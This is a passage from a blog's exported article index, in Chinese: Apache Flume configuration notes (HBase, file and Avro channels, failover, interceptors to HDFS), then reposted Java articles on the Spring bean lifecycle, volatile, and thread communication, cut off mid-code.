输出到 Hive写入太慢, 因为要转为 MR, 所以一般不会用 4.2.3 输出 (sink) 到 HBase123456789101112131415161718192021222324253.1) 配置文件===================================================================a1.sources = r1a1.channels = c1a1.sinks = k1a1.sources.r1.type = netcata1.sources.r1.bind = localhosta1.sources.r1.port = 8888a1.sinks.k1.type = hbasea1.sinks.k1.table = ns1:t12a1.sinks.k1.columnFamily = f1a1.sinks.k1.serializer = org.apache.flume.sink.hbase.RegexHbaseEventSerializera1.channels.c1.type=memorya1.sources.r1.channels = c1a1.sinks.k1.channel = c13.2) 开启 nc 输入===================================================================3.3) 在 hbase shell 中 scan 表 'ns1:t12'=================================================================== 4.2.4 输出到 kafka:TODO 4.3. Flume Channel4.3.1.Memory Channel以上用的都是Memory Channel, 不再显示 4.3.2 FileChannel1234567891011121314151617181920212223242526271) 配置===================================================================a1.sources = r1a1.sinks= k1a1.channels = c1a1.sources.r1.type=netcata1.sources.r1.bind=localhosta1.sources.r1.port=8888a1.sinks.k1.type=loggera1.channels.c1.type = filea1.channels.c1.checkpointDir = /home/centos/flume/fc_checka1.channels.c1.dataDirs = /home/centos/flume/fc_dataa1.sources.r1.channels=c1a1.sinks.k1.channel=c12) 创建的文件大概是这样===================================================================$~/flumedata&gt; ls -r fc*fc_data:log-1.meta log-1 in_use.lockfc_check:queueset in_use.lock inflighttakes inflightputs checkpoint.meta checkpoint 4.3.3 可溢出文件通道This channel is currently experimental and not recommended for use in production. 123456789101112[spillable_channel.conf]a1.channels = c1a1.channels.c1.type = SPILLABLEMEMORY#0表示禁用内存通道，等价于文件通道a1.channels.c1.memoryCapacity = 0#0,禁用文件通道，等价内存通道。a1.channels.c1.overflowCapacity = 2000a1.channels.c1.byteCapacity = 800000a1.channels.c1.checkpointDir = /user/centos/flume/fc_checka1.channels.c1.dataDirs = /user/centos/flume/fc_data 4.4 使用AvroSource和AvroSink实现跃点agent处理 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869 [avro_hop.conf]############ a1 ############# 声明3种组件a1.sources=r1a1.channels=c1a1.sinks=k1# 定义 source 信息a1.sources.r1.type=netcata1.sources.r1.bind=localhosta1.sources.r1.port=8888# 定义 sink 信息a1.sinks.k1.type=avroa1.sinks.k1.hostname=localhosta1.sinks.k1.port=9999# 定义 channel 信息a1.channels.c1.type=memory# 绑定在一起a1.sources.r1.channels=c1a1.sinks.k1.channel=c1############ a2 ############# 声明3种组件a2.sources=r2a2.channels=c2a2.sinks=k2# 定义 source 信息# source 是 avro, 绑定端口9999a2.sources.r2.type=avroa2.sources.r2.bind=localhosta2.sources.r2.port=9999# 定义 sink 信息# sink 打印到控制台a2.sinks.k2.type=logger# 定义 channel 信息a2.channels.c2.type=memory# 绑定在一起a2.sources.r2.channels=c2a2.sinks.k2.channel=c22.启动a2===================================================================$&gt;flume-ng agent -f /soft/flume/conf/avro_hop.conf -n a2 -Dflume.root.logger=INFO,console3.验证a2===================================================================$&gt;netstat -anop | grep 99994.启动a1===================================================================$&gt;flume-ng agent -f /soft/flume/conf/avro_hop.conf -n a15.验证a1===================================================================$&gt;netstat -anop | grep 88886.nc 连接a1 &amp; 发消息===================================================================$&gt;nc localhost 8888 4.5 Flume 的高可用配置 是通过配置优先级来实现主从, 优先级是组内的优先级, 需要先设置为一组 优先级高的 down 掉了, 再启动起来, 依然是主 ==&gt; 已验证 1234567891011==============================--设置优先级代配置如下----------#set sink group 设置为一组a1.sinkgroups.g1.sinks = k1 k2#set failover 设置容灾相关的参数a1.sinkgroups.g1.processor.type = failover# 设置 组内成员的优先级, 决定 主备a1.sinkgroups.g1.processor.priority.k1 = 10 a1.sinkgroups.g1.processor.priority.k2 = 1 a1.sinkgroups.g1.processor.maxpenalty = 10000 以下配置方案与上图不同的, 用的是1个 channel, 2个`sink` 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011. 配置 agent ==&gt; cs1, cs2================================================================================================[ha_agent.conf]------------------#agent name: a1 a1.channels = c1 a1.sources = r1a1.sinks = k1 k2#set gruopa1.sinkgroups = g1#set channela1.channels.c1.type = memory a1.channels.c1.capacity = 1000 a1.channels.c1.transactionCapacity = 100# set sourcesa1.sources.r1.channels = c1a1.sources.r1.type = execa1.sources.r1.command = tail -F /home/ap/flumedata/testha.log# 这里有疑问 : 这里设置拦截器的意义?? 随便设置的吗?? :TODOa1.sources.r1.interceptors = i1 i2 a1.sources.r1.interceptors.i1.type = static a1.sources.r1.interceptors.i1.key = Type a1.sources.r1.interceptors.i1.value = LOGIN a1.sources.r1.interceptors.i2.type = timestamp# set sink1 -&gt; 通过 avro 沉到 cs3的 source 上a1.sinks.k1.channel = c1 a1.sinks.k1.type = avro a1.sinks.k1.hostname = cs3 a1.sinks.k1.port = 52020# set sink2 -&gt; 通过 avro 沉到 cs4的 source 上a1.sinks.k2.channel = c1 a1.sinks.k2.type = avro a1.sinks.k2.hostname = cs4 a1.sinks.k2.port = 52020#set sink group 设置为一组a1.sinkgroups.g1.sinks = k1 k2#set failover 设置容灾相关的参数a1.sinkgroups.g1.processor.type = failover# 设置 组内成员的优先级, 决定 主备a1.sinkgroups.g1.processor.priority.k1 = 10 a1.sinkgroups.g1.processor.priority.k2 = 1 a1.sinkgroups.g1.processor.maxpenalty = 100002. 配置 collector ==&gt; cs3,cs4================================================================================================[ha_collector.conf]#set agent name a1.sources = r1a1.channels = c1 a1.sinks = k1#set channela1.channels.c1.type = memory a1.channels.c1.capacity = 1000 a1.channels.c1.transactionCapacity = 100# other node,nna to nnsa1.sources.r1.type = avro# :TODO 这些 key, value 设置了之后, 用在什么地方???## 当前主机是什么，就修改成什么主机名 a1.sources.r1.bind = cs3 a1.sources.r1.port = 52020 a1.sources.r1.interceptors = i1 a1.sources.r1.interceptors.i1.type = static a1.sources.r1.interceptors.i1.key = Collector## 当前主机是什么，就修改成什么主机名 a1.sources.r1.interceptors.i1.value = cs3 a1.sources.r1.channels = c1#set sink to hdfsa1.sinks.k1.type=hdfsa1.sinks.k1.hdfs.path=/user/ap/flume/event_ha/loghdfs a1.sinks.k1.hdfs.fileType=DataStream a1.sinks.k1.hdfs.writeFormat=TEXT a1.sinks.k1.hdfs.rollInterval=10a1.sinks.k1.channel=c1 a1.sinks.k1.hdfs.filePrefix=%Y-%m-%d3. 启动================================================================================================# 先启动 cs3,cs4 ==&gt; collector $&gt; [ap@cs4]~/apps/flume/conf/confs% flume-ng agent -f ha_collector.conf -n a1 -Dflume.root.logger=DEBUG,console# 再启动 cs1, cs2 ==&gt; agent, 连接 collector[ap@cs1]~/apps/flume/conf/confs% flume-ng agent -f ha_agent.conf -n a1 -Dflume.root.logger=DEBUG,console 4.6 实用业务场景知识点: 拦截器 interceptors 4.6.1 需求: A、B 两台日志服务机器实时生产日志主要类型为 access.log、nginx.log、web.log 现在要求: 把 A、B 机器中的 access.log、nginx.log、web.log 采集汇总到 C 机器上然后统一收集到 hdfs 中。 但是在 hdfs 中要求的目录为: /source/logs/access/20160101/** /source/logs/nginx/20160101/** /source/logs/web/20160101/** 4.6.2 需求分析需求分析图示 数据处理流程分析 在每一台节点上都要 搜集 3个 source 源 搜集完成后发往同一台节点 4.6.3 需求实现1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261.在cs1,cs2上配置flume, 通过 avro, sink到cs3=============================================================[exec_source_avro_sink.conf]------------------------------# 指定各个核心组件 a1.sources = r1 r2 r3 a1.sinks = k1 a1.channels = c1# 准备数据源# static 拦截器的功能就是往采集到的数据的 header 中插入自己定义的 key-value 对 # sources-&gt;r1a1.sources.r1.type = execa1.sources.r1.command = tail -F -c +0 /home/ap/flumedata/access.log a1.sources.r1.interceptors = i1a1.sources.r1.interceptors.i1.type = statica1.sources.r1.interceptors.i1.key = typea1.sources.r1.interceptors.i1.value = access# sources-&gt;r2a1.sources.r2.type = execa1.sources.r2.command = tail -F -c +0 /home/ap/flumedata/nginx.log a1.sources.r2.interceptors = i2a1.sources.r2.interceptors.i2.type = static a1.sources.r2.interceptors.i2.key = type a1.sources.r2.interceptors.i2.value = nginx# sources-&gt;r3a1.sources.r3.type = execa1.sources.r3.command = tail -F -c +0 /home/ap/flumedata/web.log a1.sources.r3.interceptors = i3a1.sources.r3.interceptors.i3.type = static a1.sources.r3.interceptors.i3.key = type a1.sources.r3.interceptors.i3.value = web# Describe the sinka1.sinks.k1.type = avro a1.sinks.k1.hostname = cs3 a1.sinks.k1.port = 41414# Use a channel which buffers events in memory a1.channels.c1.type = memory a1.channels.c1.capacity = 20000 a1.channels.c1.transactionCapacity = 10000# Bind the source and sink to the channel a1.sources.r1.channels = c1 a1.sources.r2.channels = c1 a1.sources.r3.channels = c1 a1.sinks.k1.channel = c12. 在 cs3上配置 flume, source 为 avro, 接受来自 cs1,cs2下沉的数据======================================================================[avro_source_hdfs_sink.conf]-------------------------------#定义 agent 名， source、channel、sink 的名称 a1.sources = r1a1.sinks = k1a1.channels = c1#定义 source a1.sources.r1.type = avro a1.sources.r1.bind = localhosta1.sources.r1.port =41414#添加时间拦截器#Note:For all of the time related escape sequences, a header with the key “timestamp” must #exist among the headers of the event (unless hdfs.useLocalTimeStamp is set to true). One way #to add this automatically is to use the TimestampInterceptor. a1.sources.r1.interceptors = i1 a1.sources.r1.interceptors.i1.type=org.apache.flume.interceptor.TimestampInterceptor$Builder#定义 channelsa1.channels.c1.type = memory #The maximum number of events stored in the channela1.channels.c1.capacity = 20000 #The maximum number of events the channel will take from a source or give to a sink per transactiona1.channels.c1.transactionCapacity = 10000#定义 sinka1.sinks.k1.type = hdfs a1.sinks.k1.hdfs.path = /user/ap/flume/event/%&#123;type&#125;/%Y%m%d a1.sinks.k1.hdfs.filePrefix = eventsa1.sinks.k1.hdfs.fileType = DataStreama1.sinks.k1.hdfs.writeFormat = Text#时间类型a1.sinks.k1.hdfs.useLocalTimeStamp = true #生成的文件不按条数生成, 否则就是按照设定的 event产生的, 1行就是一个 event #Number of events written to file before it rolled (0 = never roll based on number of events)a1.sinks.k1.hdfs.rollCount = 0#生成的文件按时间生成,单位是秒#Number of seconds to wait before rolling current file (0 = never roll based on time interval)a1.sinks.k1.hdfs.rollInterval = 30#生成的文件按大小生成, 单位是 bytes#1 MB = 1,024 KB = 1,048,576 Bytes #File size to trigger roll, in bytes (0: never roll based on file size)a1.sinks.k1.hdfs.rollSize = 10485760 #这里是10MB#批量写入 hdfs 的个数a1.sinks.k1.hdfs.batchSize = 20#flume 操作 hdfs 的线程数(包括新建，写入等) a1.sinks.k1.hdfs.threadsPoolSize=10#操作 hdfs 超时时间a1.sinks.k1.hdfs.callTimeout=30000#组装 source、channel、sink a1.sources.r1.channels = c1 a1.sinks.k1.channel = c13.启动服务============================================================================# 启动cs3 =&gt; 服务器 c[ap@cs3]~/apps/flume/conf/confs% flume-ng agent -f avro_source_hdfs_sink.conf -n a1 -Dflume.root.logger=DEBUG,console# 启动cs1, cs2 =&gt; 服务器 a, b# 注意: 千万别启错了, 否则很难找到原因..[ap@cs2]~/apps/flume/conf/confs% flume-ng agent -f exec_source_avro_sink.conf -n a1 -Dflume.root.logger=DEBUG,console==============遇到问题: 这种通过avro多点 sink 到一个 source 的时候, 实现不创建文件夹/文件的, 好像确实写入不进去...===&gt; md, 原因应该是启动错配置了 5.Flume的Maven依赖123456789101112131415161718192021222324252627282930313233&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;com.rox&lt;/groupId&gt; &lt;artifactId&gt;Flume_test&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.flume&lt;/groupId&gt; &lt;artifactId&gt;flume-ng-core&lt;/artifactId&gt; &lt;version&gt;1.6.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.flume.flume-ng-sinks&lt;/groupId&gt; &lt;artifactId&gt;flume-hdfs-sink&lt;/artifactId&gt; &lt;version&gt;1.6.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.flume.flume-ng-sinks&lt;/groupId&gt; &lt;artifactId&gt;flume-ng-hbase-sink&lt;/artifactId&gt; &lt;version&gt;1.6.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.flume.flume-ng-channels&lt;/groupId&gt; &lt;artifactId&gt;flume-file-channel&lt;/artifactId&gt; &lt;version&gt;1.6.0&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/project&gt;]]></content>
      <categories>
        <category>Hadoop</category>
        <category>Flume</category>
      </categories>
      <tags>
        <tag>原创</tag>
        <tag>技术</tag>
        <tag>Hadoop</tag>
        <tag>Flume</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[spring-bean-lifecycle]]></title>
    <url>%2F2018%2F06%2F30%2FJava%2FInterview%2FJava-Interview%2Fspring%2Fspring-bean-lifecycle%2F</url>
    <content type="text"><![CDATA[Spring Bean 生命周期前言Spring Bean 的生命周期在整个 Spring 中占有很重要的位置，掌握这些可以加深对 Spring 的理解。 首先看下生命周期图： 再谈生命周期之前有一点需要先明确： Spring 只帮我们管理单例模式 Bean 的完整生命周期，对于 prototype 的 bean ，Spring 在创建好交给使用者之后则不会再管理后续的生命周期。 注解方式在 bean 初始化时会经历几个阶段，首先可以使用注解 @PostConstruct, @PreDestroy 来在 bean 的创建和销毁阶段进行调用: 1234567891011121314@Componentpublic class AnnotationBean &#123; private final static Logger LOGGER = LoggerFactory.getLogger(AnnotationBean.class); @PostConstruct public void start()&#123; LOGGER.info("AnnotationBean start"); &#125; @PreDestroy public void destroy()&#123; LOGGER.info("AnnotationBean destroy"); &#125;&#125; InitializingBean, DisposableBean 接口还可以实现 InitializingBean,DisposableBean 这两个接口，也是在初始化以及销毁阶段调用： 12345678910111213@Servicepublic class SpringLifeCycleService implements InitializingBean,DisposableBean&#123; private final static Logger LOGGER = LoggerFactory.getLogger(SpringLifeCycleService.class); @Override public void afterPropertiesSet() throws Exception &#123; LOGGER.info("SpringLifeCycleService start"); &#125; @Override public void destroy() throws Exception &#123; LOGGER.info("SpringLifeCycleService destroy"); &#125;&#125; 自定义初始化和销毁方法也可以自定义方法用于在初始化、销毁阶段调用: 123456789101112131415161718192021222324@Configurationpublic class LifeCycleConfig &#123; @Bean(initMethod = "start", destroyMethod = "destroy") public SpringLifeCycle create()&#123; SpringLifeCycle springLifeCycle = new SpringLifeCycle() ; return springLifeCycle ; &#125;&#125;public class SpringLifeCycle&#123; private final static Logger LOGGER = LoggerFactory.getLogger(SpringLifeCycle.class); public void start()&#123; LOGGER.info("SpringLifeCycle start"); &#125; public void destroy()&#123; LOGGER.info("SpringLifeCycle destroy"); &#125;&#125; 以上是在 SpringBoot 中可以这样配置，如果是原始的基于 XML 也是可以使用: 12&lt;bean class="com.crossoverjie.spring.SpringLifeCycle" init-method="start" destroy-method="destroy"&gt;&lt;/bean&gt; 来达到同样的效果。 实现 *Aware 接口*Aware 接口可以用于在初始化 bean 时获得 Spring 中的一些对象，如获取 Spring 上下文等。 123456789101112@Componentpublic class SpringLifeCycleAware implements ApplicationContextAware &#123; private final static Logger LOGGER = LoggerFactory.getLogger(SpringLifeCycleAware.class); private ApplicationContext applicationContext ; @Override public void setApplicationContext(ApplicationContext applicationContext) throws BeansException &#123; this.applicationContext = applicationContext ; LOGGER.info("SpringLifeCycleAware start"); &#125;&#125; 这样在 springLifeCycleAware 这个 bean 初始化会就会调用 setApplicationContext 方法，并可以获得 applicationContext 对象。 BeanPostProcessor 增强处理器实现 BeanPostProcessor 接口，Spring 中所有 bean 在做初始化时都会调用该接口中的两个方法，可以用于对一些特殊的 bean 进行处理： 12345678910111213141516171819202122232425262728293031323334@Componentpublic class SpringLifeCycleProcessor implements BeanPostProcessor &#123; private final static Logger LOGGER = LoggerFactory.getLogger(SpringLifeCycleProcessor.class); /** * 预初始化 初始化之前调用 * @param bean * @param beanName * @return * @throws BeansException */ @Override public Object postProcessBeforeInitialization(Object bean, String beanName) throws BeansException &#123; if ("annotationBean".equals(beanName))&#123; LOGGER.info("SpringLifeCycleProcessor start beanName=&#123;&#125;",beanName); &#125; return bean; &#125; /** * 后初始化 bean 初始化完成调用 * @param bean * @param beanName * @return * @throws BeansException */ @Override public Object postProcessAfterInitialization(Object bean, String beanName) throws BeansException &#123; if ("annotationBean".equals(beanName))&#123; LOGGER.info("SpringLifeCycleProcessor end beanName=&#123;&#125;",beanName); &#125; return bean; &#125;&#125; 执行之后观察结果： 123456789101112131415018-03-21 00:40:24.856 [restartedMain] INFO c.c.s.p.SpringLifeCycleProcessor - SpringLifeCycleProcessor start beanName=annotationBean2018-03-21 00:40:24.860 [restartedMain] INFO c.c.spring.annotation.AnnotationBean - AnnotationBean start2018-03-21 00:40:24.861 [restartedMain] INFO c.c.s.p.SpringLifeCycleProcessor - SpringLifeCycleProcessor end beanName=annotationBean2018-03-21 00:40:24.864 [restartedMain] INFO c.c.s.aware.SpringLifeCycleAware - SpringLifeCycleAware start2018-03-21 00:40:24.867 [restartedMain] INFO c.c.s.service.SpringLifeCycleService - SpringLifeCycleService start2018-03-21 00:40:24.887 [restartedMain] INFO c.c.spring.SpringLifeCycle - SpringLifeCycle start2018-03-21 00:40:25.062 [restartedMain] INFO o.s.b.d.a.OptionalLiveReloadServer - LiveReload server is running on port 357292018-03-21 00:40:25.122 [restartedMain] INFO o.s.j.e.a.AnnotationMBeanExporter - Registering beans for JMX exposure on startup2018-03-21 00:40:25.140 [restartedMain] INFO com.crossoverjie.Application - Started Application in 2.309 seconds (JVM running for 3.681)2018-03-21 00:40:25.143 [restartedMain] INFO com.crossoverjie.Application - start ok!2018-03-21 00:40:25.153 [Thread-8] INFO o.s.c.a.AnnotationConfigApplicationContext - Closing org.springframework.context.annotation.AnnotationConfigApplicationContext@3913adad: startup date [Wed Mar 21 00:40:23 CST 2018]; root of context hierarchy2018-03-21 00:40:25.155 [Thread-8] INFO o.s.j.e.a.AnnotationMBeanExporter - Unregistering JMX-exposed beans on shutdown2018-03-21 00:40:25.156 [Thread-8] INFO c.c.spring.SpringLifeCycle - SpringLifeCycle destroy2018-03-21 00:40:25.156 [Thread-8] INFO c.c.s.service.SpringLifeCycleService - SpringLifeCycleService destroy2018-03-21 00:40:25.156 [Thread-8] INFO c.c.spring.annotation.AnnotationBean - AnnotationBean destroy 直到 Spring 上下文销毁时则会调用自定义的销毁方法以及实现了 DisposableBean 的 destroy() 方法。]]></content>
      <categories>
        <category>Github</category>
        <category>Java-Interview</category>
      </categories>
      <tags>
        <tag>技术</tag>
        <tag>Java</tag>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[volatile]]></title>
    <url>%2F2018%2F06%2F30%2FJava%2FInterview%2FJava-Interview%2Fconcurrent%2Fvolatile%2F</url>
    <content type="text"><![CDATA[你应该知道的 volatile 关键字前言不管是在面试还是实际开发中 volatile 都是一个应该掌握的技能。 首先来看看为什么会出现这个关键字。 内存可见性由于 Java 内存模型(JMM)规定，所有的变量都存放在主内存中，而每个线程都有着自己的工作内存(高速缓存)。 线程在工作时，需要将主内存中的数据拷贝到工作内存中。这样对数据的任何操作都是基于工作内存(效率提高)，并且不能直接操作主内存以及其他线程工作内存中的数据，之后再将更新之后的数据刷新到主内存中。 这里所提到的主内存可以简单认为是堆内存，而工作内存则可以认为是栈内存。 如下图所示： 所以在并发运行时可能会出现线程 B 所读取到的数据是线程 A 更新之前的数据。 显然这肯定是会出问题的，因此 volatile 的作用出现了： 当一个变量被 volatile 修饰时，任何线程对它的写操作都会立即刷新到主内存中，并且会强制让缓存了该变量的线程中的数据清空，必须从主内存重新读取最新数据。 volatile 修饰之后并不是让线程直接从主内存中获取数据，依然需要将变量拷贝到工作内存中。 内存可见性的应用当我们需要在两个线程间依据主内存通信时，通信的那个变量就必须的用 volatile 来修饰： 1234567891011121314151617181920212223242526272829public class Volatile implements Runnable&#123; private static volatile boolean flag = true ; @Override public void run() &#123; while (flag)&#123; System.out.println(Thread.currentThread().getName() + "正在运行。。。"); &#125; System.out.println(Thread.currentThread().getName() +"执行完毕"); &#125; public static void main(String[] args) throws InterruptedException &#123; Volatile aVolatile = new Volatile(); new Thread(aVolatile,"thread A").start(); System.out.println("main 线程正在运行") ; TimeUnit.MILLISECONDS.sleep(100) ; aVolatile.stopThread(); &#125; private void stopThread()&#123; flag = false ; &#125;&#125; 主线程在修改了标志位使得线程 A 立即停止，如果没有用 volatile 修饰，就有可能出现延迟。 但这里有个误区，这样的使用方式容易给人的感觉是： 对 volatile 修饰的变量进行并发操作是线程安全的。 这里要重点强调，volatile 并不能保证线程安全性！ 如下程序: 1234567891011121314151617181920212223242526272829303132public class VolatileInc implements Runnable&#123; private static volatile int count = 0 ; //使用 volatile 修饰基本数据内存不能保证原子性 //private static AtomicInteger count = new AtomicInteger() ; @Override public void run() &#123; for (int i=0;i&lt;10000 ;i++)&#123; count ++ ; //count.incrementAndGet() ; &#125; &#125; public static void main(String[] args) throws InterruptedException &#123; VolatileInc volatileInc = new VolatileInc() ; Thread t1 = new Thread(volatileInc,"t1") ; Thread t2 = new Thread(volatileInc,"t2") ; t1.start(); //t1.join(); t2.start(); //t2.join(); for (int i=0;i&lt;10000 ;i++)&#123; count ++ ; //count.incrementAndGet(); &#125; System.out.println("最终Count="+count); &#125;&#125; 当我们三个线程(t1,t2,main)同时对一个 int 进行累加时会发现最终的值都会小于 30000。 这是因为虽然 volatile 保证了内存可见性，每个线程拿到的值都是最新值，但 count ++ 这个操作并不是原子的，这里面涉及到获取值、自增、赋值的操作并不能同时完成。 所以想到达到线程安全可以使这三个线程串行执行(其实就是单线程，没有发挥多线程的优势)。 也可以使用 synchronize 或者是锁的方式来保证原子性。 还可以用 Atomic 包中 AtomicInteger 来替换 int，它利用了 CAS 算法来保证了原子性。 指令重排内存可见性只是 volatile 的其中一个语义，它还可以防止 JVM 进行指令重排优化。 举一个伪代码: 123int a=10 ;//1int b=20 ;//2int c= a+b ;//3 一段特别简单的代码，理想情况下它的执行顺序是：1&gt;2&gt;3。但有可能经过 JVM 优化之后的执行顺序变为了 2&gt;1&gt;3。 可以发现不管 JVM 怎么优化，前提都是保证单线程中最终结果不变的情况下进行的。 可能这里还看不出有什么问题，那看下一段伪代码: 12345678910111213141516171819private static Map&lt;String,String&gt; value ;private static volatile boolean flag = fasle ;//以下方法发生在线程 A 中 初始化 Mappublic void initMap()&#123; //耗时操作 value = getMapValue() ;//1 flag = true ;//2&#125;//发生在线程 B中 等到 Map 初始化成功进行其他操作public void doSomeThing()&#123; while(!flag)&#123; sleep() ; &#125; //dosomething doSomeThing(value);&#125; 这里就能看出问题了，当 flag 没有被 volatile 修饰时，JVM 对 1 和 2 进行重排，导致 value 都还没有被初始化就有可能被线程 B 使用了。 所以加上 volatile 之后可以防止这样的重排优化，保证业务的正确性。 指令重排的的应用一个经典的使用场景就是双重懒加载的单例模式了: 12345678910111213141516171819public class Singleton &#123; private static volatile Singleton singleton; private Singleton() &#123; &#125; public static Singleton getInstance() &#123; if (singleton == null) &#123; synchronized (Singleton.class) &#123; if (singleton == null) &#123; //防止指令重排 singleton = new Singleton(); &#125; &#125; &#125; return singleton; &#125;&#125; 这里的 volatile 关键字主要是为了防止指令重排。 如果不用 ，singleton = new Singleton();，这段代码其实是分为三步： 分配内存空间。(1) 初始化对象。(2) 将 singleton 对象指向分配的内存地址。(3) 加上 volatile 是为了让以上的三步操作顺序执行，反之有可能第二步在第三步之前被执行就有可能某个线程拿到的单例对象是还没有初始化的，以致于报错。 总结volatile 在 Java 并发中用的很多，比如像 Atomic 包中的 value、以及 AbstractQueuedLongSynchronizer 中的 state 都是被定义为 volatile 来用于保证内存可见性。 将这块理解透彻对我们编写并发程序时可以提供很大帮助。]]></content>
      <categories>
        <category>Github</category>
        <category>Java-Interview</category>
      </categories>
      <tags>
        <tag>技术</tag>
        <tag>Java</tag>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[thread-communication]]></title>
    <url>%2F2018%2F06%2F30%2FJava%2FInterview%2FJava-Interview%2Fconcurrent%2Fthread-communication%2F</url>
    <content type="text"><![CDATA[深入理解线程通信前言开发中不免会遇到需要所有子线程执行完毕通知主线程处理某些逻辑的场景。 或者是线程 A 在执行到某个条件通知线程 B 执行某个操作。 可以通过以下几种方式实现： 等待通知机制 等待通知模式是 Java 中比较经典的线程通信方式。 两个线程通过对同一对象调用等待 wait() 和通知 notify() 方法来进行通讯。 如两个线程交替打印奇偶数： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091public class TwoThreadWaitNotify &#123; private int start = 1; private boolean flag = false; public static void main(String[] args) &#123; TwoThreadWaitNotify twoThread = new TwoThreadWaitNotify(); Thread t1 = new Thread(new OuNum(twoThread)); t1.setName("A"); Thread t2 = new Thread(new JiNum(twoThread)); t2.setName("B"); t1.start(); t2.start(); &#125; /** * 偶数线程 */ public static class OuNum implements Runnable &#123; private TwoThreadWaitNotify number; public OuNum(TwoThreadWaitNotify number) &#123; this.number = number; &#125; @Override public void run() &#123; while (number.start &lt;= 100) &#123; synchronized (TwoThreadWaitNotify.class) &#123; System.out.println("偶数线程抢到锁了"); if (number.flag) &#123; System.out.println(Thread.currentThread().getName() + "+-+偶数" + number.start); number.start++; number.flag = false; TwoThreadWaitNotify.class.notify(); &#125;else &#123; try &#123; TwoThreadWaitNotify.class.wait(); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; &#125; &#125; &#125; &#125; /** * 奇数线程 */ public static class JiNum implements Runnable &#123; private TwoThreadWaitNotify number; public JiNum(TwoThreadWaitNotify number) &#123; this.number = number; &#125; @Override public void run() &#123; while (number.start &lt;= 100) &#123; synchronized (TwoThreadWaitNotify.class) &#123; System.out.println("奇数线程抢到锁了"); if (!number.flag) &#123; System.out.println(Thread.currentThread().getName() + "+-+奇数" + number.start); number.start++; number.flag = true; TwoThreadWaitNotify.class.notify(); &#125;else &#123; try &#123; TwoThreadWaitNotify.class.wait(); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; &#125; &#125; &#125; &#125;&#125; 输出结果： 12345678t2+-+奇数93t1+-+偶数94t2+-+奇数95t1+-+偶数96t2+-+奇数97t1+-+偶数98t2+-+奇数99t1+-+偶数100 这里的线程 A 和线程 B 都对同一个对象 TwoThreadWaitNotify.class 获取锁，A 线程调用了同步对象的 wait() 方法释放了锁并进入 WAITING 状态。 B 线程调用了 notify() 方法，这样 A 线程收到通知之后就可以从 wait() 方法中返回。 这里利用了 TwoThreadWaitNotify.class 对象完成了通信。 有一些需要注意: wait() 、nofify() 、nofityAll() 调用的前提都是获得了对象的锁(也可称为对象监视器)。 调用 wait() 方法后线程会释放锁，进入 WAITING 状态，该线程也会被移动到等待队列中。 调用 notify() 方法会将等待队列中的线程移动到同步队列中，线程状态也会更新为 BLOCKED 从 wait() 方法返回的前提是调用 notify() 方法的线程释放锁，wait() 方法的线程获得锁。 等待通知有着一个经典范式： 线程 A 作为消费者： 获取对象的锁。 进入 while(判断条件)，并调用 wait() 方法。 当条件满足跳出循环执行具体处理逻辑。 线程 B 作为生产者: 获取对象锁。 更改与线程 A 共用的判断条件。 调用 notify() 方法。 伪代码如下: 1234567891011121314//Thread Asynchronized(Object)&#123; while(条件)&#123; Object.wait(); &#125; //do something&#125;//Thread Bsynchronized(Object)&#123; 条件=false;//改变条件 Object.notify();&#125; join() 方法1234567891011121314151617181920212223242526272829303132333435private static void join() throws InterruptedException &#123; Thread t1 = new Thread(new Runnable() &#123; @Override public void run() &#123; LOGGER.info("running"); try &#123; Thread.sleep(3000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; &#125;) ; Thread t2 = new Thread(new Runnable() &#123; @Override public void run() &#123; LOGGER.info("running2"); try &#123; Thread.sleep(4000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; &#125;) ; t1.start(); t2.start(); //等待线程1终止 t1.join(); //等待线程2终止 t2.join(); LOGGER.info("main over");&#125; 输出结果: 1232018-03-16 20:21:30.967 [Thread-1] INFO c.c.actual.ThreadCommunication - running22018-03-16 20:21:30.967 [Thread-0] INFO c.c.actual.ThreadCommunication - running2018-03-16 20:21:34.972 [main] INFO c.c.actual.ThreadCommunication - main over 在 t1.join() 时会一直阻塞到 t1 执行完毕，所以最终主线程会等待 t1 和 t2 线程执行完毕。 其实从源码可以看出，join() 也是利用的等待通知机制： 核心逻辑: 123while (isAlive()) &#123; wait(0);&#125; 在 join 线程完成后会调用 notifyAll() 方法，是在 JVM 实现中调用，所以这里看不出来。 volatile 共享内存因为 Java 是采用共享内存的方式进行线程通信的，所以可以采用以下方式用主线程关闭 A 线程: 1234567891011121314151617181920212223242526272829public class Volatile implements Runnable&#123; private static volatile boolean flag = true ; @Override public void run() &#123; while (flag)&#123; System.out.println(Thread.currentThread().getName() + "正在运行。。。"); &#125; System.out.println(Thread.currentThread().getName() +"执行完毕"); &#125; public static void main(String[] args) throws InterruptedException &#123; Volatile aVolatile = new Volatile(); new 